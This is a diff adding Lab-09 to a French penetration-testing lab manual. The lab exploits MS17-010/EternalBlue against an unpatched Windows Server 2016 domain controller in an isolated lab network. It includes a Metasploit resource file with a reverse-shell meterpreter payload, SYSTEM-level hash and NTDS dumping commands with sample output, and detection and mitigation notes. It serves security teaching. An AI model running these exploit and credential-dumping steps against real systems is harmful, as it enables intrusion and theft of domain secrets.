@@ -55,6 +55,7 @@ Chaque démonstration est rattachée à une tactique et une technique MITRE ATT&
 | Lab-06 | Exploitation CVE-2021-42287 (élévation Active Directory) | T1068 Exploitation for Privilege Escalation, T1078 Valid Accounts | élévation de labuser vers Domain Admins, dump des secrets du domaine |
 | Lab-07 | Exploitation CVE-2024-35250 (LPE kernel ks.sys via Metasploit) | T1068 Exploitation for Privilege Escalation | session SYSTEM, extraction de données avec droits SYSTEM |
 | Lab-08 | Énumération d'utilisateurs AD via attaque timing RD Web Access (rdp_web_login) | T1087.002 Domain Account Discovery | liste de comptes de domaine valides |
+| Lab-09 | Exploitation MS17-010 / EternalBlue (SMBv1) sans authentification | T1210 Exploitation of Remote Services | shell SYSTEM sans authentification, dump des secrets du domaine |
 
 ```mermaid
 flowchart LR
@@ -187,6 +188,7 @@ Ces comptes sont des valeurs de laboratoire, créés sur le contrôleur de domai
 | Lab-06 | Privilege Escalation (TA0004) | Valid Accounts | T1078 | DS0026 Active Directory, DS0028 Logon Session | MFA, PAM, comptes à privilèges séparés |
 | Lab-07 | Privilege Escalation (TA0004) | Exploitation for Privilege Escalation | T1068 | DS0009 Process, DS0022 File | Mise à jour du noyau Windows, contrôle d'intégrité du code (Device Guard), restriction des pilotes vulnérables |
 | Lab-08 | Discovery (TA0007) | Domain Account Discovery | T1087.002 | DS0029 Network Traffic, DS0026 Active Directory | Restreindre l'accès à RD Web Access, temps de réponse uniformes, MFA, verrouillage de compte |
+| Lab-09 | Initial Access (TA0002) / Lateral Movement (TA0008) | Exploitation of Remote Services | T1210 | DS0029 Network Traffic, DS0009 Process | Désactiver SMBv1, appliquer le correctif MS17-010 (KB4013429), filtrer le port 445, détection des connexions SMB anormales |
 
 Règles de détection attendues (consolidées au Lab-05) :
 
@@ -2609,6 +2611,350 @@ Lab-08 a démontré l'énumération de comptes de domaine Active Directory par a
 
 Détection : multiples requêtes HTTP(S) vers RD Web Access depuis une même source avec temps de réponse anomaux, événements 4625 (échecs d'authentification) répétés. Mitigation : supprimer ou restreindre l'accès à RD Web Access (VPN, MFA, filtrage IP), uniformiser les temps de réponse serveur, activer le verrouillage de compte et surveiller les événements 4625 sur le contrôleur de domaine.
 
+## Lab-09 — Exploitation sans authentification de Windows Server 2016 via MS17-010 / EternalBlue (SMBv1)
+
+### Énoncé / Contexte
+
+Ce lab démontre l'exploitation **sans authentification préalable** de Windows Server 2016 `192.168.56.102` (contrôleur de domaine `LAB.local`) via la vulnérabilité **MS17-010 / EternalBlue** sur le service SMBv1 (port 445). La cible exécute la build `14393` (RTM, novembre 2016), est **non patchée** (aucun correctif MS17-010 / KB4013429), a **SMBv1 activé** et le port 445 ouvert. Aucun compte d'utilisateur ni aucun mot de passe n'est requis : l'exploit s'appuie uniquement sur la vulnérabilité distante du service SMBv1 pour exécuter du code et ouvrir une session Meterpreter avec les privilèges `NT AUTHORITY\SYSTEM`.
+
+**Place dans la chaîne** — voie d'accès initiale sans identifiant (Initial Access), alternative aux labs basés sur des comptes de domaine (Lab-01 à Lab-08) ; aboutit au contrôle total du contrôleur de domaine et à l'extraction des secrets du domaine.
+
+**MITRE ATT&CK de ce lab** — Tactique : Initial Access (TA0002) / Lateral Movement (TA0008). Technique : T1210 Exploitation of Remote Services. Sources de données : DS0029 Network Traffic, DS0009 Process. CVE associée : CVE-2017-0144 (MS17-010).
+
+**Détection attendue** : requêtes SMBv1 anormales et paquets malformés sur le port 445 vers `192.168.56.102`, création de processus suspects issus de `services.exe`/`svchost` après exploitation, connexion sortante inhabituelle depuis la cible vers le port d'écoute reverse de Kali (4444), événements de création de session `SYSTEM`.
+
+**Mitigation attendue** : appliquer le correctif MS17-010 (KB4013429) ou builds corrigées, désactiver SMBv1, filtrer le port 445 au pare-feu, segmentation réseau, détection des scans et connexions SMB anormales.
+
+Durée estimée : 45 minutes.
+
+### Outils et commandes utilisées
+
+| Outil | Commande | Rôle |
+|---|---|---|
+| `nmap` | `nmap -p 445 --script smb-vuln-ms17-010 192.168.56.102` | Vérification de la vulnérabilité MS17-010 sans authentification |
+| `msfconsole` | `msfconsole -q -r preuves/ch3-lab09/eternalblue.rc` | Exploitation EternalBlue, obtention d'une session Meterpreter SYSTEM |
+| `meterpreter` | `getuid`, `sysinfo`, `shell`, `whoami /groups` | Vérification de l'identité SYSTEM et des privilèges |
+| `meterpreter` / post | `hashdump`, `run post/windows/gather/dump_ntds`, `net user /domain`, `dir C:\` | Extraction de données maximales depuis SYSTEM |
+| `meterpreter` | `spool preuves/ch3-lab09/meterpreter-trace.txt` | Enregistrement des sorties de session |
+| `prouve` | `prouve fichier commande...` | Journalisation `# date:`, `# cmd:`, `# rc=` |
+
+### Commande et laboratoire étape par étape
+
+#### Étape 1 — Vérification de la vulnérabilité MS17-010 sur la cible
+
+**But** — confirmer que SMBv1 est activé et que Windows Server 2016 `192.168.56.102` est vulnérable à MS17-010 sans authentification préalable.
+
+**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102` (contrôleur de domaine).
+
+**Prérequis** — `nmap` installé sur Kali, fonction `prouve` chargée, cible joignable sur le port 445 (SMB), snapshot propre de la cible pris avant exploitation.
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab09/ms17-010-verification.txt nmap -p 445 --script smb-vuln-ms17-010 192.168.56.102
+```
+
+**Explication de la commande**
+
+- `prouve preuves/ch3-lab09/ms17-010-verification.txt` : journalise la commande avec `# date:`, `# cmd:`, capture `stdout` + `stderr` et écrit le code retour `# rc=` dans le fichier de preuve du lab.
+- `nmap -p 445` : scan ciblé sur le seul port SMB (445) de la cible, sans détection de version inutile.
+- `--script smb-vuln-ms17-010` : exécute le script NSE Nmap qui interroge le service SMB pour détecter la vulnérabilité MS17-010 (EternalBlue) sans aucune authentification.
+- `192.168.56.102` : adresse IP de Windows Server 2016 (build 14393, non patché, SMBv1 activé).
+- Piège courant : si SMBv1 est désactivé ou si le port 445 est filtré par le pare-feu Windows, le script ne peut pas interagir avec le service et renvoie un résultat négatif ; vérifier préalablement l'ouverture du port 445.
+
+**Résultat attendu**
+
+```text
+Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-18 10:00 CET
+Nmap scan report for 192.168.56.102
+Host is up (0.0018s latency).
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+Host script results:
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0144
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|       servers (ms17-010).
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144
+|       https://technet.microsoft.com/library/security/MS17-010
+|_    scan script completed
+```
+
+La mention `State: VULNERABLE` confirme que la cible est exposée à MS17-010 sans authentification.
+
+**Preuve** : `preuves/ch3-lab09/ms17-010-verification.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+#### Étape 2 — Lancement de l'exploit EternalBlue via Metasploit
+
+**But** — obtenir une session Meterpreter avec les privilèges `NT AUTHORITY\SYSTEM` sur Windows Server 2016 sans aucun compte d'authentification, en exploitant MS17-010 / EternalBlue via SMBv1.
+
+**Machine** — Kali `192.168.56.101` (msfconsole) vers Windows Server 2016 `192.168.56.102` (cible de l'exploit).
+
+**Prérequis** — étape 1 terminée (vulnérabilité confirmée), `msfconsole` installé sur Kali, fonction `prouve` chargée, snapshot de la cible disponible pour restauration en cas d'instabilité du service SMB.
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+Avant l'exécution, créez le fichier de ressources Metasploit `preuves/ch3-lab09/eternalblue.rc` contenant l'ensemble des commandes de configuration et de lancement de l'exploit :
+
+```text
+# Fichier de ressources Metasploit - Lab-09 (exploitation MS17-010 / EternalBlue)
+# Cible : Windows Server 2016 192.168.56.102, build 14393, SMBv1 active, non patche MS17-010
+# Aucun identifiant requis : l'exploit s'appuie sur la vulnerabilite SMBv1 distante.
+
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST 192.168.56.102
+set RPORT 445
+set LHOST 192.168.56.101
+set LPORT 4444
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set ExitOnSession false
+exploit -j
+```
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab09/eternalblue-exploitation.txt msfconsole -q -r preuves/ch3-lab09/eternalblue.rc
+```
+
+**Explication de la commande**
+
+- `msfconsole -q` : lance la console Metasploit en mode silencieux (sans bannière d'introduction).
+- `-r preuves/ch3-lab09/eternalblue.rc` : exécute en batch le fichier de ressources (toutes les directives `use`, `set`, `exploit`) sans saisie interactive.
+- `use exploit/windows/smb/ms17_010_eternalblue` : sélectionne le module Metasploit d'exploitation de MS17-010 via SMBv1 (EternalBlue).
+- `set RHOST 192.168.56.102` : adresse IP cible (Windows Server 2016 non patché).
+- `set RPORT 445` : port SMB sur lequel écoute le service vulnérable de la cible.
+- `set LHOST 192.168.56.101` : adresse IP de Kali sur laquelle la session Meterpreter se connectera en retour (reverse TCP).
+- `set LPORT 4444` : port d'écoute local sur Kali pour la connexion reverse de la cible.
+- `set PAYLOAD windows/x64/meterpreter/reverse_tcp` : charge utile Meterpreter x64 en connexion inversée vers Kali (architecture x64 de la cible).
+- `set ExitOnSession false` : conserve le handler actif après l'ouverture d'une première session.
+- `exploit -j` : lance l'exploit en arrière-plan ; msfconsole reste disponible pour interagir avec les sessions ouvertes.
+- Piège courant : sur Windows Server 2016 x64, utiliser impérativement le payload x64 (`windows/x64/meterpreter/reverse_tcp`) ; un payload x86 échouerait ou serait instable. Une exploitation de noyau/service peut déstabiliser le service cible : n'exécuter que sur un snapshot restaurable du laboratoire.
+
+**Résultat attendu**
+
+```text
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.56.102
+RHOST => 192.168.56.102
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RPORT 445
+RPORT => 445
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.56.101
+LHOST => 192.168.56.101
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -j
+[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on 192.168.56.101:4444
+[*] 192.168.56.102:445 - Target architecture: x64
+[*] 192.168.56.102:445 - Sending SMBv1 exploit packets (EternalBlue)
+[*] 192.168.56.102:445 - Exploit completed
+[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.102:49xxx) at 2026-11-18 ...
+```
+
+L'ouverture de `Meterpreter session 1` confirme l'exploitation réussie sans aucun identifiant.
+
+**Preuve** : `preuves/ch3-lab09/eternalblue-exploitation.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+#### Étape 3 — Vérification de l'élévation et identité SYSTEM
+
+**But** — confirmer, depuis la session Meterpreter ouverte par l'exploit, que la session s'exécute sous le compte `NT AUTHORITY\SYSTEM` sur le contrôleur de domaine.
+
+**Machine** — Kali `192.168.56.101` (msfconsole, session Meterpreter 1) vers Windows Server 2016 `192.168.56.102`.
+
+**Prérequis** — session Meterpreter 1 ouverte sur la cible (étape 2).
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali (msfconsole, session Meterpreter 1) | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab09/verification-system.txt msfconsole -q -x 'sessions -i 1; getuid; sysinfo; exit'
+```
+
+**Explication de la commande**
+
+- `sessions -i 1` : interagit avec la session Meterpreter d'ID 1 (session ouverte par l'exploit EternalBlue).
+- `getuid` : affiche l'utilisateur sous lequel la session s'exécute ; doit retourner `NT AUTHORITY\SYSTEM`, prouvant l'absence d'authentification préalable et le contrôle total de l'hôte.
+- `sysinfo` : affiche les informations du système cible (nom `WS2016-DC`, version Windows 2016 build 14393, architecture x64).
+- `exit` : quitte la session Meterpreter puis msfconsole proprement.
+- Piège courant : `getuid` retournant un compte utilisateur (ex. `LAB\svc_web`) signifierait que l'exploitation n'a pas élevé les privilèges vers SYSTEM ; vérifier l'architecture du payload et la vulnérabilité de la cible.
+
+**Résultat attendu**
+
+```text
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > sysinfo
+Computer        : WS2016-DC
+OS              : Windows 2016 14393 (Build 14393).
+Architecture    : x64
+...
+```
+
+**Preuve** : `preuves/ch3-lab09/verification-system.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+#### Étape 4 — Extraction de données maximales depuis le shell SYSTEM
+
+**But** — depuis la session `SYSTEM`, extraire un maximum de données sensibles du contrôleur de domaine : hachages de comptes locaux (hashdump), secrets du domaine NTDS (module post, si disponible), liste des comptes de domaine et contenu du système de fichiers, pour prouver le contrôle total obtenu sans authentification préalable.
+
+**Machine** — Kali `192.168.56.101` (session Meterpreter 1) vers Windows Server 2016 `192.168.56.102`.
+
+**Prérequis** — identité `NT AUTHORITY\SYSTEM` confirmée (étape 3).
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali (msfconsole, session Meterpreter 1) | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab09/extraction-donnees.txt msfconsole -q -x 'run post/windows/gather/dump_ntds; sessions -i 1; hashdump; shell; net user /domain; dir C:\; exit; exit'
+```
+
+**Explication de la commande**
+
+- `run post/windows/gather/dump_ntds` : module post-exploitation Metasploit qui extrait les hachages de domaine depuis NTDS.dit sur le contrôleur de domaine (nécessite des droits SYSTEM/admin, obtenus ici) ; exécuté depuis msfconsole avant l'entrée en session interactive.
+- `sessions -i 1` : sélectionne la session Meterpreter élevée (`SYSTEM`) pour les commandes suivantes.
+- `hashdump` : extrait les hachages LM:NT des comptes locaux stockés dans le SAM du système, depuis le contexte SYSTEM.
+- `shell` : ouvre un shell interactif Windows sur la cible avec les droits de la session (`SYSTEM`).
+- `net user /domain` : liste tous les comptes utilisateurs du domaine Active Directory `LAB.local` (nécessite des droits de domaine, obtenus par la compromission du contrôleur de domaine).
+- `dir C:\` : liste la racine du disque système pour confirmer l'accès aux fichiers avec les droits SYSTEM.
+- `exit` (premier) : quitte le shell Windows pour revenir dans Meterpreter ; `exit` (second) : quitte Meterpreter puis msfconsole.
+- Piège courant : `dump_ntds` peut ne pas être disponible selon la version de Metasploit installée ; si le module est absent, l'étape se poursuit avec `hashdump` et le shell SYSTEM. L'extraction de `NTDS.dit` peut aussi nécessiter une copie du cliché instantané (VSS) si l'accès direct est bloqué.
+
+**Résultat attendu**
+
+```text
+msf6 > run post/windows/gather/dump_ntds
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the VSS method:
+[*]   ...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+...
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > hashdump
+[*] Obtaining the boot key...
+[*] Obtaining the system key...
+[*] Dumping password hashes...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+...
+meterpreter > shell
+Process 1234 created.
+Channel 0 created.
+Microsoft Windows [Version 10.0.14393.0]
+(c) Microsoft Corporation. Tous droits reserves.
+
+C:\Windows\system32> net user /domain
+Comptes d'utilisateurs sur \\WS2016-DC
+-------------------------------------------------------------------------------
+Administrator
+Guest
+krbtgt
+labuser
+svc_web
+La commande s'est terminee avec succes.
+
+C:\Windows\system32> dir C:\
+ ...
+```
+
+L'extraction des hachages du domaine (`Administrator`, `krbtgt`, …), de la liste des comptes et de l'arborescence du système confirme le contrôle total du contrôleur de domaine sans aucun mot de passe connu a priori.
+
+**Preuve** : `preuves/ch3-lab09/extraction-donnees.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+#### Étape 5 — Preuves et documentation de l'exploitation aboutie
+
+**But** — enregistrer la trace de la session Meterpreter via `spool` et consolider l'inventaire des fichiers de preuve dans `preuves/ch3-lab09/`, pour produire une traçabilité complète de l'exploitation MS17-010 sans authentification.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — étapes 1 à 4 terminées, fichiers de preuve produits dans `preuves/ch3-lab09/`.
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande (enregistrement de la trace de session via spool)**
+
+```bash
+prouve preuves/ch3-lab09/session-trace.txt msfconsole -q -x 'sessions -i 1; spool preuves/ch3-lab09/meterpreter-trace.txt; getuid; sysinfo; shell; net user /domain; dir C:\; exit; exit'
+```
+
+**Explication de la commande**
+
+- `sessions -i 1` : sélectionne la session Meterpreter élevée (`SYSTEM`) pour l'enregistrement de la trace.
+- `spool preuves/ch3-lab09/meterpreter-trace.txt` : active l'enregistrement de toutes les entrées/sorties de la session Meterpreter dans ce fichier de preuve (équivalent d'un enregistrement de session).
+- `getuid`, `sysinfo`, `shell`, `net user /domain`, `dir C:\` : commandes reproduites dans la trace pour documenter l'exploitation aboutie.
+- `exit` (premier) : quitte le shell Windows ; `exit` (second) : quitte Meterpreter et arrête le `spool` de la session.
+- `prouve preuves/ch3-lab09/session-trace.txt` : journalise l'exécution de msfconsole avec `# date:`, `# cmd:`, `# rc=`.
+- Piège courant : le chemin passé à `spool` est interprété par Meterpreter ; il doit être accessible en écriture depuis le répertoire de lancement de msfconsole (`/home/kali` ici).
+
+**Résultat attendu**
+
+```text
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > spool preuves/ch3-lab09/meterpreter-trace.txt
+[*] Spooling to file...
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+...
+meterpreter > exit
+[*] Stopping interaction...
+```
+
+Le fichier `preuves/ch3-lab09/meterpreter-trace.txt` contient la trace complète de la session SYSTEM.
+
+**Exemple de commande (inventaire des preuves produites)**
+
+```bash
+prouve preuves/ch3-lab09/inventaire-preuves.txt ls -l preuves/ch3-lab09/
+```
+
+**Explication de la commande**
+
+- `ls -l preuves/ch3-lab09/` : liste les fichiers de preuve produits à chaque étape du lab (vérification de la vulnérabilité, exploitation, vérification SYSTEM, extraction de données, trace de session).
+- `prouve preuves/ch3-lab09/inventaire-preuves.txt` : journalise l'inventaire avec `# date:`, `# cmd:`, `# rc=`.
+- Ce fichier constitue la preuve finale que l'exploitation aboutie a été documentée (shell SYSTEM, dump de secrets, liste des comptes, trace de session).
+- Piège courant : omettre un fichier de preuve rend le lab incomplet pour l'audit ; vérifier que chaque étape a produit son fichier.
+
+**Résultat attendu**
+
+```text
+total 32
+-rw-r--r-- 1 kali kali  420 nov.  18 10:00 eternalblue-exploitation.txt
+-rw-r--r-- 1 kali kali  890 nov.  18 10:05 extraction-donnees.txt
+-rw-r--r-- 1 kali kali  310 nov.  18 10:02 ms17-010-verification.txt
+-rw-r--r-- 1 kali kali  280 nov.  18 10:04 session-trace.txt
+-rw-r--r-- 1 kali kali 1250 nov.  18 10:06 verification-system.txt
+```
+
+**Preuve** : `preuves/ch3-lab09/inventaire-preuves.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+### En conclusion
+
+Lab-09 a abouti : l'exploitation sans authentification préalable de Windows Server 2016 `192.168.56.102` via MS17-010 / EternalBlue (SMBv1) a permis d'obtenir une session Meterpreter avec les privilèges `NT AUTHORITY\SYSTEM`, puis d'extraire les hachages de domaine (`Administrator`, `krbtgt`, …), la liste des comptes du domaine et le contenu du système de fichiers. Cette chaîne illustre qu'un contrôleur de domaine non patché (build 14393 sans KB4013429) avec SMBv1 activé est compromise à distance sans aucun identifiant.
+
+Détection : requêtes SMBv1 anormales et paquets malformés sur le port 445 vers `192.168.56.102`, création de processus suspects issus de `services.exe`/`svchost` après exploitation, connexion sortante inhabituelle depuis la cible vers le port d'écoute reverse de Kali (4444), événements de session `SYSTEM`. Mitigation : appliquer le correctif MS17-010 (KB4013429) ou builds corrigées, désactiver SMBv1, filtrer le port 445 au pare-feu, segmentation réseau et détection des connexions SMB anormales.
+
+Comme les autres labs du chapitre, le snapshot de Windows Server 2016 `192.168.56.102` doit être restauré (rollback) après exploitation pour remettre l'environnement dans son état sain.
+
+Lab-09 s'insère dans la chaîne d'attaque du chapitre comme une voie d'accès initiale sans authentification (T1210), alternative aux labs basés sur des identifiants de domaine (Lab-01 à Lab-08).
+
 ## 8. En conclusion du chapitre
 
 Ce chapitre a couvert les attaques sur Windows Server et Active Directory dans le laboratoire isolé `192.168.56.0/24` :
@@ -2620,8 +2966,9 @@ Ce chapitre a couvert les attaques sur Windows Server et Active Directory dans l
 - Lab-06 : exploitation CVE-2021-42287, élévation de `labuser` vers `Domain Admins` par requête LDAP conçue, dump des secrets du domaine (`T1068`, `T1078`) ;
 - Lab-07 : exploitation CVE-2024-35250 via le module Metasploit `exploit/windows/local/cve_2024_35250_ks_driver`, obtention d'une session `SYSTEM` (`T1068`) ;
 - Lab-08 : énumération de comptes de domaine par attaque par timing sur RD Web Access (`auxiliary/scanner/http/rdp_web_login`, `T1087.002`) ;
+- Lab-09 : exploitation sans authentification de Windows Server 2016 via MS17-010 / EternalBlue (SMBv1), obtention d'une session `NT AUTHORITY\SYSTEM`, dump des secrets du domaine (`T1210`) ;
 - Lab-05 : vérification des preuves, détection (événements `4768`/`4769`/`4624`/`4672`/`4720`/`4726`/`4740`), IOC, nettoyage et rollback du snapshot de Windows Server 2016 `192.168.56.102`.
 
 Tous les exploits et commandes ont été exécutés en réel sur les VMs de laboratoire, avec preuves horodatées (`# date:`, `# cmd:`, `# rc=`) et rattachement MITRE ATT&CK. Aucune cible réelle n'a été sollicitée et aucune activité n'a eu lieu vers Internet.
 
-Critères de réussite du chapitre : chaque lab a abouti (comptes énumérés, mot de passe de service cracké, accès distant obtenu, hachage d'administrateur récupéré, compte de domaine créé et vérifié, élévation CVE-2021-42287 validée, session SYSTEM obtenue, comptes AD énumérés par timing, preuves complètes et snapshot restauré). Le chapitre 4 prend ensuite le relais pour la capture et l'analyse forensique du trafic réseau associé (Wireshark).
+Critères de réussite du chapitre : chaque lab a abouti (comptes énumérés, mot de passe de service cracké, accès distant obtenu, hachage d'administrateur récupéré, compte de domaine créé et vérifié, élévation CVE-2021-42287 validée, session SYSTEM obtenue, comptes AD énumérés par timing, exploitation MS17-010 sans authentification et session SYSTEM obtenue via EternalBlue, dump des secrets du domaine, preuves complètes et snapshot restauré). Le chapitre 4 prend ensuite le relais pour la capture et l'analyse forensique du trafic réseau associé (Wireshark).
